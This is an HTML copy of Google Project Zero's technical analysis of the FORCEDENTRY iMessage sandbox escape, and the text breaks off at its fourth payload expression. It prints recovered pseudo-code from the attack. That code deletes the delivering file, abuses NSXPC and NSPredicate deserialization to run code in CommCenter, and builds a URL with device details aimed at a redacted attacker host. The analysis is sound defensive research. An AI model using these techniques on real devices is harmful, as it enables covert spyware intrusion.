<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html">Original</a>
    <h1>FORCEDENTRY: Sandbox Escape</h1>
    
    <div id="readability-page-1" class="page"><div id="post-body-1353264177358891846" itemprop="description articleBody">

 <p><span>Posted by Ian Beer &amp; </span><span>Samuel Groß</span><span> of Google Project Zero</span></p>
 
 <p><span>We want to thank Citizen Lab for sharing a sample of the FORCEDENTRY exploit with us, and Apple’s Security Engineering and Architecture (SEAR) group for collaborating with us on the technical analysis. Any editorial opinions reflected below are solely Project Zero’s and do not necessarily reflect those of the organizations we collaborated with during this research.</span></p>
 
 <p><span>Late last year </span><span><a href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html">we published a writeup</a></span><span> of the initial remote code execution stage of FORCEDENTRY, the zero-click iMessage exploit attributed by Citizen Lab to NSO.</span><span> By sending a </span><span>.gif</span><span> iMessage attachment (which was really a PDF) NSO were able to remotely trigger a heap buffer overflow in the ImageIO JBIG2 decoder. They used that vulnerability to bootstrap a powerful </span><span><a href="https://en.wikipedia.org/wiki/Weird_machine">weird machine</a></span><span> capable of loading the next stage in the infection process: the sandbox escape.</span></p>
 
 <p><span>In this post we&#39;ll take a look at that sandbox escape. It&#39;s notable for using only logic bugs. In fact it&#39;s unclear where the features that it uses end and the vulnerabilities which it abuses begin. Both current and upcoming state-of-the-art mitigations such as Pointer Authentication and Memory Tagging have no impact at all on this sandbox escape.</span></p><h2 id="h.80ze3m83kn16"><span>An observation</span></h2>
 <p><span>During our initial analysis of the </span><span>.gif</span><span> file Samuel noticed that rendering the image appeared to leak memory.</span><span> Running the </span><span>heap</span><span> tool after releasing all the associated resources gave the following output:</span></p>
 
 <p><span>$</span><span> heap $pid</span></p>
 <p><span>------------------------------------------------------------</span></p>
 <p><span>All zones: 4631 nodes (826336 bytes)                                                                       </span></p>
 
 <p><span>   COUNT    BYTES     AVG   CLASS_NAME   TYPE   BINARY                                                                                                                      </span></p>
 <p><span>   =====    =====     ===   ==========   ====   ======        </span></p>
 <p><span>    1969   469120   238.3   non-object                                                                                                                                                                            </span></p>
 <p><span>     825    26400    32.0   JBIG2Bitmap  C++   CoreGraphics</span></p>
 
 <p><span>heap</span><span> was able to determine that the leaked memory contained </span><span>JBIG2Bitmap</span><span> objects.</span></p>
 
 <p><span>Using the </span><span>-address</span><span> option we could find all the individual leaked bitmap objects:</span></p>
 
 <p><span>$ heap -address JBIG2Bitmap $pid</span></p>
 
 <p><span>and dump them out to files. </span><span>One of those objects was quite unlike the others:</span></p>
 
 <p><span>$ hexdump -C dumpXX.bin | head</span></p>
 
 <p><span>00000000  62 70 6c 69 73 74 30 30  |bplist00|</span></p>
 <p><span>...</span></p>
 <p><span>00000018        24 76 65 72 73 69  |  $versi|</span></p>
 <p><span>00000020  6f 6e 59 24 61 72 63 68  |onY$arch|</span></p>
 <p><span>00000028  69 76 65 72 58 24 6f 62  |iverX$ob|</span></p>
 <p><span>00000030  6a 65 63 74 73 54 24 74  |jectsT$t|</span></p>
 <p><span>00000038  6f 70                    |op      |</span></p>
 <p><span>00000040        4e 53 4b 65 79 65  |  NSKeye|</span></p>
 <p><span>00000048  64 41 72 63 68 69 76 65  |dArchive|</span></p>
 
 <p><span>It&#39;s clearly a serialized </span><span><a href="https://developer.apple.com/documentation/foundation/nskeyedarchiver?language=objc">NSKeyedArchiver</a></span><span>. Definitely not what you&#39;d expect to see in a </span><span>JBIG2Bitmap</span><span> object. Running </span><span>strings</span><span> we see plenty of interesting things (noting that the URL below is redacted):</span></p>
 
 <p><span>Objective-C class and selector names:</span></p>
 <p><span>NSFunctionExpression</span></p>
 <p><span>NSConstantValueExpression</span></p>
 <p><span>NSConstantValue</span></p>
 <p><span>expressionValueWithObject:context:</span></p>
 <p><span>filteredArrayUsingPredicate:</span></p>
 <p><span>_web_removeFileOnlyAtPath:</span></p>
 <p><span>context:evaluateMobileSubscriberIdentity:</span></p>
 <p><span>performSelectorOnMainThread:withObject:waitUntilDone:</span></p>
 <p><span>...</span></p>
 
 <p><span>The name of the file which delivered the exploit:</span></p>
 <p><span>XXX.gif</span></p>
 
 <p><span>Filesystems paths:</span></p>
 <p><span>/tmp/com.apple.messages</span></p>
 <p><span>/System/Library/PrivateFrameworks/SlideshowKit.framework/Frameworks/OpusFoundation.framework</span></p>
 
 <p><span>a URL:</span></p>
 <p><span>https://XXX.cloudfront.net/YYY/ZZZ/megalodon?AAA</span></p>
 
 <p><span>Using </span><span>plutil</span><span> we can convert the </span><span>bplist00</span><span> binary format to XML. Performing some post-processing and cleanup we can see that the top-level object in the </span><span>NSKeyedArchiver</span><span> is a serialized </span><span>NSFunctionExpression</span><span> object.</span></p><h2 id="h.1ai2h2r4yshv"><span>NSExpression NSPredicate NSExpression</span></h2>
 <p><span>If you&#39;ve ever used Core Data or tried to filter a Objective-C collection you might have come across </span><span>NSPredicates</span><span>. </span><span><a href="https://developer.apple.com/documentation/foundation/nspredicate?language=objc">According to Apple&#39;s public documentation</a></span><span> they are used </span><span>&#34;</span><span>to define logical conditions for constraining a search for a fetch or for in-memory filtering</span><span>&#34;</span><span>.</span></p>
 
 <p><span>For example, in Objective-C you could filter an </span><span>NSArray</span><span> object like this:</span></p>
 
 <p><span>  NSArray* names = @[@&#34;one&#34;, @&#34;two&#34;, @&#34;three&#34;];</span></p>
 
 <p><span>  NSPredicate* pred;</span></p>
 <p><span>  pred = [NSPredicate predicateWithFormat:</span></p>
 <p><span>            @&#34;</span><span>SELF beginswith[c] &#39;t&#39;</span><span>&#34;];</span></p>
 
 <p><span>  NSLog(@&#34;%@&#34;, [names filteredArrayUsingPredicate:pred]);</span></p>
 
 <p><span>The predicate is &#34;</span><span>SELF beginswith[c] &#39;t&#39;&#34;</span><span>. This prints an </span><span>NSArray</span><span> containing only &#34;</span><span>two</span><span>&#34; and &#34;</span><span>three</span><span>&#34;.</span></p>
 
 <p><span>[NSPredicate predicateWithFormat]</span><span> builds a predicate object by parsing a small query language, a little like an SQL query. </span></p>
 
 <p><span>NSPredicates</span><span> can be built up from </span><span>NSExpressions</span><span>, connected by </span><span>NSComparisonPredicates</span><span> (like less-than, greater-than and so on.)</span></p>
 
 <p><span>NSExpressions</span><span> themselves can be fairly complex, containing aggregate expressions (like &#34;</span><span>IN</span><span>&#34; and &#34;</span><span>CONTAINS</span><span>&#34;), subqueries, set expressions, and, most interestingly, function expressions.</span></p>
 
 <p><span>Prior to 2007 (in OS X 10.4 and below) function expressions were limited to just the following five extra built-in methods: </span><span>sum</span><span>, </span><span>count</span><span>, </span><span>min</span><span>, </span><span>max</span><span>, and </span><span>average</span><span>.</span></p>
 
 <p><span>But starting in OS X 10.5 (which would also be around the launch of iOS in 2007) </span><span>NSFunctionExpressions</span><span> were extended</span><span> </span><span><a href="https://developer.apple.com/documentation/foundation/nsexpression">to allow </a></span><span><a href="https://developer.apple.com/documentation/foundation/nsexpression">arbitrary</a></span><span><a href="https://developer.apple.com/documentation/foundation/nsexpression"> method invocations</a></span><span> with the </span><span>FUNCTION</span><span> keyword:</span></p>
 
 <p><span>  &#34;FUNCTION(&#39;abc&#39;, &#39;stringByAppendingString&#39;, &#39;def&#39;)&#34; =&gt; @&#34;abcdef&#34;</span></p>
 
 <p><span>FUNCTION</span><span> takes a target object, a selector and an optional list of arguments then invokes the selector on the object, passing the arguments. In this case it will allocate an </span><span>NSString</span><span> object </span><span>@&#34;abc&#34;</span><span> then invoke the </span><span>stringByAppendingString:</span><span> selector passing the </span><span>NSString</span><span> </span><span>@&#34;def&#34;</span><span>, which will evaluate to the </span><span>NSString</span><span> </span><span>@&#34;abcdef&#34;</span><span>.</span></p>
 
 <p><span>In addition to the </span><span>FUNCTION</span><span> keyword there&#39;s </span><span>CAST</span><span> which allows full reflection-based access to all Objective-C types (as opposed to just being able to invoke selectors on literal strings and integers):</span></p>
 
 <p><span>  &#34;</span><span>FUNCTION(CAST(&#39;NSFileManager&#39;, &#39;Class&#39;), &#39;defaultManager&#39;)&#34;</span></p>
 
 <p><span>Here we can get access to the </span><span>NSFileManager</span><span> class and call the </span><span>defaultManager</span><span> selector to get a reference to a process&#39;s shared file manager instance.</span></p>
 
 <p><span>These keywords exist in the string representation of </span><span>NSPredicates</span><span> and </span><span>NSExpressions</span><span>. Parsing those strings involves creating a graph of </span><span>NSExpression</span><span> objects, </span><span>NSPredicate</span><span> objects and their subclasses like </span><span>NSFunctionExpression</span><span>. It&#39;s a serialized version of such a graph which is present in the JBIG2 bitmap.</span></p>
 
 <p><span>NSPredicates</span><span> using the </span><span>FUNCTION</span><span> keyword are effectively Objective-C scripts. With some tricks it&#39;s possible to build nested function calls which can do almost anything you could do in procedural Objective-C. Figuring out some of those tricks was the key to the 2019 </span><span><a href="https://realworldctf.com/">Real World CTF</a></span><span> </span><span><a href="https://github.com/ChiChou/DezhouInstrumenz/">DezhouInstrumenz</a></span><span> challenge, which would evaluate an attacker supplied </span><span>NSExpression</span><span> format string. The </span><span><a href="https://blog.chichou.me/2021/01/16/see-no-eval-runtime-code-execution-objc/">writeup by the challenge author</a></span><span> is a great introduction to these ideas and I&#39;d strongly recommend reading that now if you haven&#39;t. The rest of this post builds on the tricks described in that post.</span></p><h2 id="h.lu8fbgty57ln"><span>A tale of two parts</span></h2>
 <p><span>The only job of the JBIG2 logic gate machine described in the previous blog post is to cause the deserialization and evaluation of an embedded </span><span>NSFunctionExpression</span><span>. No attempt is made to get native code execution, ROP, JOP or any similar technique.</span></p>
 
 <p><span>Prior to iOS 14.5 the </span><span>isa</span><span> field of an Objective-C object was not protected by Pointer Authentication Codes (</span><span>PAC)</span><span>, </span><span>so the JBIG2 machine builds a fake Objective-C object with a fake </span><span>isa</span><span> such that the invocation of the </span><span>dealloc</span><span> selector causes the deserialization and evaluation of the </span><span>NSFunctionExpression</span><span>. This is very similar to the technique used by </span><span><a href="https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-3.html">Samuel in the 2020 SLOP post</a></span><span>. </span></p>
 
 <p><span>This </span><span>NSFunctionExpression</span><span> has two purposes:</span></p>
 
 <p><span>Firstly, it allocates and leaks an </span><span>ASMKeepAlive</span><span> object then tries to cover its tracks by finding and deleting the </span><span>.gif</span><span> file which delivered the exploit.</span></p>
 
 <p><span>Secondly, it builds a payload </span><span>NSPredicate</span><span> object then triggers a logic bug to get that </span><span>NSPredicate</span><span> object evaluated in the </span><span>CommCenter</span><span> process, reachable from the </span><span>IMTranscoderAgent</span><span> sandbox via the </span><span>com.apple.commcenter.xpc</span><span> </span><span>NSXPC</span><span> service.</span></p>
 
 <p><span>Let&#39;s look at those two parts separately:</span></p><h2 id="h.t2uistlubhwq"><span>Covering tracks</span></h2>
 <p><span>The outer level </span><span>NSFunctionExpression</span><span> calls </span><span>performSelectorOnMainThread:withObject:waitUntilDone</span><span> which in turn calls </span><span>makeObjectsPerformSelector:@&#34;expressionValueWithObject:context:&#34;</span><span> on an </span><span>NSArray</span><span> of four </span><span>NSFunctionExpressions</span><span>. This allows the four independent </span><span>NSFunctionExpressions</span><span> to be evaluated sequentially.</span></p>
 
 <p><span>With some manual cleanup we can recover pseudo-Objective-C versions of the serialized </span><span>NSFunctionExpressions</span><span>. </span></p>
 
 <p><span>The first one does this:</span></p>
 
 <p><span>[[AMSKeepAlive alloc] initWithName:&#34;KA&#34;]</span></p>
 
 <p><span>This allocates and then </span><span>leaks an </span><span>AppleMediaServices</span><span> </span><span>KeepAlive</span><span> object</span><span>. The exact purpose of this is unclear.</span></p>
 
 <p><span>The second entry does this:</span></p>
 
 <p><span>[[NSFileManager defaultManager] _web_removeFileOnlyAtPath: </span></p>
 <p><span>  [@&#34;/tmp/com.apple.messages&#34; stringByAppendingPathComponent:</span></p>
 <p><span>    [ [ [ [</span></p>
 <p><span>            [NSFileManager defaultManager]</span></p>
 <p><span>            enumeratorAtPath: @&#34;/tmp/com.apple.messages&#34;</span></p>
 <p><span>          ]</span></p>
 <p><span>          allObjects</span></p>
 <p><span>        ]</span></p>
 <p><span>        filteredArrayUsingPredicate:</span></p>
 <p><span>          [</span></p>
 <p><span>            [NSPredicate predicateWithFormat:</span></p>
 <p><span>              [</span></p>
 <p><span>                [@&#34;SELF ENDSWITH &#39;&#34;</span></p>
 <p><span>                  stringByAppendingString: &#34;XXX.gif&#34;]</span></p>
 <p><span>                stringByAppendingString: &#34;&#39;&#34;</span></p>
 <p><span>      ]   ] ] ]</span></p>
 <p><span>      firstObject</span></p>
 <p><span>    ]</span></p>
 <p><span>  ]</span></p>
 <p><span>]</span></p>
 
 <p><span>Reading these single expression </span><span>NSFunctionExpressions</span><span> is a little tricky; breaking that down into a more procedural form it&#39;s equivalent to this:</span></p>
 
 <p><span>NSFileManager* fm = [NSFileManager defaultManager];</span></p>
 <p><span>NSDirectoryEnumerator* dir_enum;</span></p>
 <p><span>dir_enum = [fm enumeratorAtPath: @&#34;/tmp/com.apple.messages&#34;]</span></p>
 <p><span>NSArray* allTmpFiles = [dir_enum allObjects];</span></p>
 
 <p><span>NSString* filter;</span></p>
 <p><span>filter = [&#34;@&#34;SELF ENDSWITH &#39;&#34; stringByAppendingString: &#34;XXX.gif&#34;];</span></p>
 <p><span>filter = [filter stringByAppendingString: &#34;&#39;&#34;];</span></p>
 
 <p><span>NSPredicate* pred;</span></p>
 <p><span>pred = [NSPredicate predicateWithFormat: filter]</span></p>
 
 <p><span>NSArray* matches;</span></p>
 <p><span>matches = [allTmpFiles filteredArrayUsingPredicate: pred];</span></p>
 
 <p><span>NSString* gif_subpath = [matches firstObject];</span></p>
 
 <p><span>NSString* root = @&#34;/tmp/com.apple.messages&#34;;</span></p>
 <p><span>NSString* full_path;</span></p>
 <p><span>full_path = [root stringByAppendingPathComponent: gifSubpath];</span></p>
 
 <p><span>[fm _web_removeFileOnlyAtPath: full_path];</span></p>
 
 <p><span>This finds the </span><span>XXX.gif</span><span> file used to deliver the exploit which iMessage has stored somewhere under the </span><span>/tmp/com.apple.messages</span><span> </span><span>folder and deletes it</span><span>.</span></p>
 
 <p><span>The other two </span><span>NSFunctionExpressions</span><span> build a payload and then trigger its evaluation in </span><span>CommCenter</span><span>. For that we need to look at </span><span>NSXPC</span><span>.</span></p><h2 id="h.3sby3b68al28"><span>NSXPC</span></h2>
 <p><span>NSXPC is a semi-transparent remote-procedure-call mechanism for Objective-C. It allows the instantiation of proxy objects in one process which transparently forward method calls to the &#34;real&#34; object in another process:</span></p>
 
 
 <p><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiju_-thk9djtuTJr7kWQuOIF8O3xydoja-FIW5gcwq9s1TGTtvobsRcyQ9_TFbXhta_6I9VQj0u8hyJfLixzGgmOFT4jy3UAcV31MT24-p_vwCGpotG5jQdna1PxNHW3EaSN4d1cQ_vpXAKKWy1V5us-ZlEvUkN5dAq-KjgQFLcQ97jglBLYky_lqs2w/s1437/image1.png"><img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiju_-thk9djtuTJr7kWQuOIF8O3xydoja-FIW5gcwq9s1TGTtvobsRcyQ9_TFbXhta_6I9VQj0u8hyJfLixzGgmOFT4jy3UAcV31MT24-p_vwCGpotG5jQdna1PxNHW3EaSN4d1cQ_vpXAKKWy1V5us-ZlEvUkN5dAq-KjgQFLcQ97jglBLYky_lqs2w/s600/image1.png"/></a></span></p>
 <p><span>https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html</span></p>
 
 <p><span>I say NSXPC is only semi-transparent because it does enforce some restrictions on what objects are allowed to traverse process boundaries. Any object &#34;exported&#34; via </span><span>NSXPC</span><span> must also define a </span><span>protocol</span><span> which designates which methods can be invoked and the allowable types for each argument. The </span><span><a href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html#//apple_ref/doc/uid/10000172i-SW6-SW7">NSXPC programming guide</a></span><span> further explains the extra handling required for methods which require collections and other edge cases.</span></p>
 
 <p><span>The low-level serialization used by NSXPC is the same explored by Natalie Silvanovich in her 2019 blog post looking at </span><span><a href="https://googleprojectzero.blogspot.com/2019/08/the-fully-remote-attack-surface-of.html">the fully-remote attack surface of the iPhone</a></span><span>. An important observation in that post was that </span><span>subclasses of classes with any level of inheritance are also allowed, as is always the case with NSKeyedUnarchiver deserialization.</span></p>
 
 <p><span>This means that any </span><span>protocol</span><span> object which declares a particular type for a field will also, by design, accept any subclass of that type.</span></p>
 
 <p><span>The logical extreme of this would be that a protocol which declared an argument type of NSObject would allow any subclass, which is the vast majority of all Objective-C classes.</span></p><h2 id="h.v64ixuc668lc"><span>Grep to the rescue</span></h2>
 <p><span>This is fairly easy to analyze automatically. Protocols are defined statically so we can just find them and check each one. Tools like </span><span><a href="https://github.com/nst/RuntimeBrowser/">RuntimeBrowser</a></span><span> and </span><span><a href="http://stevenygard.com/projects/class-dump/">classdump</a></span><span> can parse the static protocol definitions and output human-readable source code. Grepping the output of RuntimeBrowser like this is sufficient to find dozens of cases of </span><span>NSObject</span><span> </span><span>pointers in Objective-C protocols:</span></p>
 
 <p><span>  $ egrep -Rn &#34;\(NSObject \*\)arg&#34; *</span></p>
 
 <p><span>Not all the results are necessarily exposed via </span><span>NSXPC</span><span>, but some clearly are, including the following two matches in </span><span>CoreTelephony.framework</span><span>:</span></p>
 
 <p><span>Frameworks/CoreTelephony.framework/\</span></p>
 <p><span>CTXPCServiceSubscriberInterface-Protocol.h:39:</span></p>
 
 <p><span>-(void)evaluateMobileSubscriberIdentity:</span></p>
 <p><span>        (CTXPCServiceSubscriptionContext *)arg1</span></p>
 <p><span>       identity:(NSObject *)arg2</span></p>
 <p><span>       completion:(void (^)(NSError *))arg3;</span></p>
 
 <p><span>Frameworks/CoreTelephony.framework/\</span></p>
 <p><span>CTXPCServiceCarrierBundleInterface-Protocol.h:13:</span></p>
 <p><span>-(void)setWiFiCallingSettingPreferences:</span></p>
 <p><span>         (CTXPCServiceSubscriptionContext *)arg1</span></p>
 <p><span>       key:(NSString *)arg2</span></p>
 <p><span>       value:(NSObject *)arg3</span></p>
 <p><span>       completion:(void (^)(NSError *))arg4;</span></p>
 
 <p><span>evaluateMobileSubscriberIdentity</span><span> string appears in the list of selector-like strings we first saw when running strings on the </span><span>bplist00</span><span>. Indeed, looking at the parsed and beautified </span><span>NSFunctionExpression</span><span> we see it doing this:</span></p>
 
 <p><span>[ [ [CoreTelephonyClient alloc] init]</span></p>
 <p><span>  context:X</span></p>
 <p><span>  evaluateMobileSubscriberIdentity:Y]</span></p>
 
 <p><span>This is a wrapper around the lower-level </span><span>NSXPC</span><span> code and the argument passed as </span><span>Y</span><span> above to the CoreTelephonyClient method corresponds to the </span><span>identity:(NSObject *)arg2</span><span> argument passed via </span><span>NSXPC</span><span> to </span><span>CommCenter</span><span> (which is the process that hosts </span><span>com.apple.commcenter.xpc</span><span>, the </span><span>NSXPC</span><span> service underlying the </span><span>CoreTelephonyClient</span><span>). Since the parameter is explicitly named as </span><span>NSObject*</span><span> we can in fact pass any subclass of </span><span>NSObject*</span><span>, including an </span><span>NSPredicate</span><span>! Game over?</span></p><h2 id="h.7ums8k4ivkbp"><span>Parsing vs Evaluation</span></h2>
 <p><span>It&#39;s not quite that easy. The </span><span><a href="https://blog.chichou.me/2021/01/16/see-no-eval-runtime-code-execution-objc/">DezhouInstrumentz writeup</a></span><span> discusses this attack surface and notes that there&#39;s an extra, specific mitigation. When an </span><span>NSPredicate</span><span> is deserialized by its </span><span>initWithCoder:</span><span> implementation it sets a flag which disables evaluation of the predicate until the </span><span>allowEvaluation</span><span> method is called.</span></p>
 
 <p><span>So whilst you certainly can pass an </span><span>NSPredicate*</span><span> as the </span><span>identity</span><span> argument across NSXPC and get it deserialized in </span><span>CommCenter,</span><span> </span><span>the implementation of </span><span>evaluateMobileSubscriberIdentity:</span><span> in </span><span>CommCenter</span><span> is definitely not going to call </span><span>allowEvaluation:</span><span>  to make the predicate safe for evaluation then </span><span>evaluateWithObject:</span><span> and then evaluate it.</span></p><h2 id="h.34h1kqwr3d8t"><span>Old techniques, new tricks</span></h2>
 <p><span>From the exploit we can see that they in fact pass an </span><span>NSArray</span><span> with two elements:</span></p>
 
 <p><span>[0] = AVSpeechSynthesisVoice</span></p>
 <p><span>[1] = PTSection {rows = NSArray { [0] = PTRow() }</span></p>
 
 <p><span>The first element is an </span><span>AVSpeechSynthesisVoice</span><span> object and the second is a </span><span>PTSection</span><span> containing a single </span><span>PTRow</span><span>. Why?</span></p>
 
 <p><span>PTSection</span><span> and </span><span>PTRow</span><span> are both defined in the </span><span>PrototypeTools</span><span> private framework. </span><span>PrototypeTools</span><span> isn&#39;t loaded in the </span><span>CommCenter</span><span> target process. Let&#39;s look at what happens when an </span><span>AVSpeechSynthesisVoice</span><span> is deserialized:</span></p><h2 id="h.ihjz2r1jcklz"><span>Finding a voice</span></h2>
 <p><span>AVSpeechSynthesisVoice</span><span> is implemented in </span><span>AVFAudio.framework</span><span>, which </span><span>is</span><span> loaded in </span><span>CommCenter</span><span>:</span></p>
 
 <p><span>$ sudo vmmap `pgrep CommCenter` | grep AVFAudio</span></p>
 <p><span>__TEXT  7ffa22c4c000-7ffa22d44000 r-x/r-x SM=COW \</span></p>
 <p><span>/System/Library/Frameworks/AVFAudio.framework/Versions/A/AVFAudio</span></p>
 
 <p><span>Assuming that this was the first time that an </span><span>AVSpeechSynthesisVoice</span><span> object was created inside CommCenter (which is quite likely) the Objective-C runtime will call the </span><span>initialize</span><span> method on the </span><span>AVSpeechSynthesisVoice</span><span> class </span><span><a href="https://developer.apple.com/documentation/objectivec/nsobject/1418639-initialize?language=objc">before instantiating the first instance</a></span><span>.</span></p>
 
 <p><span>[AVSpeechSynthesisVoice initialize]</span><span> has a </span><span>dispatch_once</span><span> block with the following code:</span></p>
 
 <p><span>NSBundle* bundle;</span></p>
 <p><span>bundle = [NSBundle bundleWithPath:</span></p>
 <p><span>                     @&#34;/System/Library/AccessibilityBundles/\</span></p>
 <p><span>                         AXSpeechImplementation.bundle&#34;];</span></p>
 
 <p><span>if (![bundle isLoaded]) {</span></p>
 <p><span>    NSError err;</span></p>
 <p><span>    [bundle loadAndReturnError:&amp;err]</span></p>
 <p><span>}</span></p>
 
 <p><span>So sending a serialized </span><span>AVSpeechSynthesisVoice</span><span> object will cause </span><span>CommCenter</span><span> to load the </span><span>/System/Library/AccessibilityBundles/AXSpeechImplementation.bundle</span><span> library. With some scripting using otool -L to list dependencies we can  find the following dependency chain from </span><span>AXSpeechImplementation.bundle</span><span> to </span><span>PrototypeTools.framework</span><span>:</span></p>
 
 <p><span>[&#39;/System/Library/AccessibilityBundles/\</span></p>
 <p><span>    AXSpeechImplementation.bundle/AXSpeechImplementation&#39;,</span></p>
 <p><span> &#39;/System/Library/AccessibilityBundles/\</span></p>
 <p><span>    AXSpeechImplementation.bundle/AXSpeechImplementation&#39;,</span></p>
 <p><span> &#39;/System/Library/PrivateFrameworks/\</span></p>
 <p><span>    AccessibilityUtilities.framework/AccessibilityUtilities&#39;,</span></p>
 <p><span> &#39;/System/Library/PrivateFrameworks/\</span></p>
 <p><span>    AccessibilitySharedSupport.framework/AccessibilitySharedSupport&#39;,</span></p>
 <p><span>&#39;/System/Library/PrivateFrameworks/Sharing.framework/Sharing&#39;,</span></p>
 <p><span>&#39;/System/Library/PrivateFrameworks/\</span></p>
 <p><span>    PrototypeTools.framework/PrototypeTools&#39;]</span></p>
 
 <p><span>This explains how the deserialization of a </span><span>PTSection</span><span> will succeed. But what&#39;s so special about </span><span>PTSections</span><span> and </span><span>PTRows</span><span>?</span></p><h2 id="h.tsdrbvcjutdl"><span>Predicated Sections</span></h2>
 <p><span>[PTRow initwithcoder:]</span><span> contains the following snippet:</span></p>
 
 <p><span>  self-&gt;condition = [coder decodeObjectOfClass:NSPredicate</span></p>
 <p><span>                           forKey:@&#34;condition&#34;]</span></p>
 <p><span>  [self-&gt;condition allowEvaluation]</span></p>
 
 <p><span>This will deserialize an </span><span>NSPredicate</span><span> object, assign it to the </span><span>PTRow</span><span> member variable </span><span>condition</span><span> and call </span><span>allowEvaluation</span><span>. This is meant to indicate that the deserializing code considers this predicate safe, but there&#39;s no attempt to perform any validation on the predicate contents here. They then need one more trick to find a path to which will additionally evaluate the </span><span>PTRow</span><span>&#39;s condition predicate.</span></p>
 
 <p><span>Here&#39;s a snippet from </span><span>[PTSection initWithCoder:]</span><span>:</span></p>
 
 <p><span>NSSet* allowed = [NSSet setWithObjects: @[PTRow]]</span></p>
 <p><span>id* rows = [coder </span><span>decodeObjectOfClasses</span><span>:allowed forKey:@&#34;rows&#34;]</span></p>
 
 <p><span>[self initWithRows:rows]</span></p>
 
 <p><span>This deserializes an array of </span><span>PTRows</span><span> and passes them to </span><span>[PTSection initWithRows]</span><span> which assigns a copy of the array of </span><span>PTRows</span><span> to</span><span> PTSection-&gt;rows</span><span> then calls </span><span>[self </span><span>_reloadEnabledRows</span><span>]</span><span> which in turn passes each row to </span><span>[self _shouldEnableRow:]</span></p>
 
 <p><span>_shouldEnableRow:row {</span></p>
 <p><span>  if (row-&gt;condition) {</span></p>
 <p><span>    return [row-&gt;condition evaluateWithObject: self-&gt;settings]</span></p>
 <p><span>  }</span></p>
 <p><span>}</span></p>
 
 <p><span>And thus, by sending a </span><span>PTSection</span><span> containing a single </span><span>PTRow</span><span> with an attached condition </span><span>NSPredicate</span><span> they can cause the evaluation of an arbitrary </span><span>NSPredicate</span><span>, effectively equivalent to arbitrary code execution in the context of </span><span>CommCenter</span><span>. </span></p><h2 id="h.9aaj7tmx81zt"><span>Payload 2</span></h2>
 <p><span>The </span><span>NSPredicate</span><span> attached to the </span><span>PTRow</span><span> uses a similar trick to the first payload to cause the evaluation of six independent </span><span>NSFunctionExpressions</span><span>, but this time in the context of the </span><span>CommCenter</span><span> process. </span><span>They&#39;re presented here in pseudo Objective-C:</span></p><h3 id="h.4c2mqlgknm1m"><span>Expression 1</span></h3>
 <p><span>[  [CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p><span>   setObject:</span></p>
 <p><span>     @[[NSURLComponents</span></p>
 <p><span>         componentsWithString:</span></p>
 <p><span>         @&#34;https://cloudfront.net/XXX/XXX/XXX?aaaa&#34;], &#39;0&#39;]</span></p>
 <p><span>   forKey: @&#34;0&#34;</span></p>
 <p><span>]</span></p>
 
 <p><span>The use of </span><span>[CaliCalendarAnonymizer sharedAnonymizedStrings]</span><span> is a trick to enable the array of independent </span><span>NSFunctionExpressions</span><span> to have &#34;local variables&#34;. In this first case they create an </span><span><a href="https://developer.apple.com/documentation/foundation/nsurlcomponents">NSURLComponents</a></span><span> object which is used to build parameterised URLs. This URL builder is then stored in the global dictionary returned by </span><span>[CaliCalendarAnonymizer sharedAnonymizedStrings]</span><span> under the key &#34;</span><span>0</span><span>&#34;.</span></p>
 <h3 id="h.f96qjcb9lnky"><span>Expression 2</span></h3>
 <p><span>[[NSBundle</span></p>
 <p><span>  bundleWithPath:@&#34;/System/Library/PrivateFrameworks/\</span></p>
 <p><span>     SlideshowKit.framework/Frameworks/OpusFoundation.framework&#34;</span></p>
 <p><span> ] load]</span></p>
 
 <p><span>This causes the </span><span>OpusFoundation</span><span> library to be loaded. The exact reason for this is unclear, though the dependency graph of </span><span>OpusFoundation</span><span> does include </span><span>AuthKit</span><span> which is used by the next </span><span>NSFunctionExpression</span><span>. It&#39;s possible that this payload is generic and might also be expected to work when evaluated in processes where </span><span>AuthKit</span><span> isn&#39;t loaded.</span></p><h3 id="h.o9lhtiv01xpk"><span>Expression 3</span></h3>
 <p><span>[ [ [CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p><span>    objectForKey:@&#34;0&#34; ]</span></p>
 <p><span>  setQueryItems:</span></p>
 <p><span>    [ [ [NSArray arrayWithObject: </span></p>
 <p><span>                 [NSURLQueryItem</span></p>
 <p><span>                    queryItemWithName: @&#34;m&#34;</span></p>
 <p><span>                    value:[AKDevice _hardwareModel] ]</span></p>
 <p><span>                                 ] arrayByAddingObject: </span></p>
 <p><span>                 [NSURLQueryItem</span></p>
 <p><span>                    queryItemWithName: @&#34;v&#34;</span></p>
 <p><span>                    value:[AKDevice _buildNumber] ]</span></p>
 <p><span>                                 ] arrayByAddingObject:</span></p>
 <p><span>                 [NSURLQueryItem</span></p>
 <p><span>                    queryItemWithName: @&#34;u&#34;</span></p>
 <p><span>                    value:[NSString randomString]]</span></p>
 <p><span>]</span></p>
 
 <p><span>This grabs a reference to the </span><span>NSURLComponents</span><span> object stored under the &#34;</span><span>0</span><span>&#34; key in the global </span><span>sharedAnonymizedStrings</span><span> dictionary then parameterizes the HTTP query string with three values:</span></p>
 
 <p><span>  </span><span>[AKDevice _hardwareModel]</span><span> returns a string like &#34;</span><span>iPhone12,3</span><span>&#34; which determines the exact device model.</span></p>
 
 <p><span>  </span><span>[AKDevice _buildNumber]</span><span> returns a string like &#34;</span><span>18A8395</span><span>&#34; which in combination with the device model allows determining the exact firmware image running on the device.</span></p>
 
 <p><span>  </span><span>[NSString randomString]</span><span> returns a decimal string representation of a 32-bit random integer like &#34;</span><span>394681493</span><span>&#34;.</span></p><h3 id="h.ifxeb8zet13e"><span>Expression 4</span></h3>
